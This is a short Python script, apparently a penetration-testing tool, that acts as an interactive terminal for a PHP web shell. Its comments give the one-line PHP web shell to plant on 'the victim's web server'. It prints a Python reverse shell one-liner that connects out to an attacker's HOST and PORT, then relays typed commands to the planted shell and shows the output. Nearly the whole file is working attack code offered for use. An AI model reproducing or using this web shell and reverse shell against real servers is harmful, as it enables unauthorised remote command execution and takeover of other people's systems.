import requests
import sys

# Python terminal for PHP Web Shell
# Version 1.1
# 2022-01-05

# Create or upload the PHP Web Shell to the victim's web server/
# echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php

# Change the full URL accordingly:

print('')
print('To create a stable reverse shell use:')
print('python3 -c "import os,pty,socket;s=socket.socket();s.connect((\'HOST\',PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\'sh\')"')
print('')
url = input('Enter the full URL of the PHP Web Shell: ')
print('')
while True:
    cmd = str(input('Web Shell $ '))
    if cmd == 'exit':
        sys.exit(0)
    response = requests.get(url, params={'cmd':cmd}, verify=False)
    print(response.text)

# To execute the console run the following command on the attcker machine
# python3 webshell.py
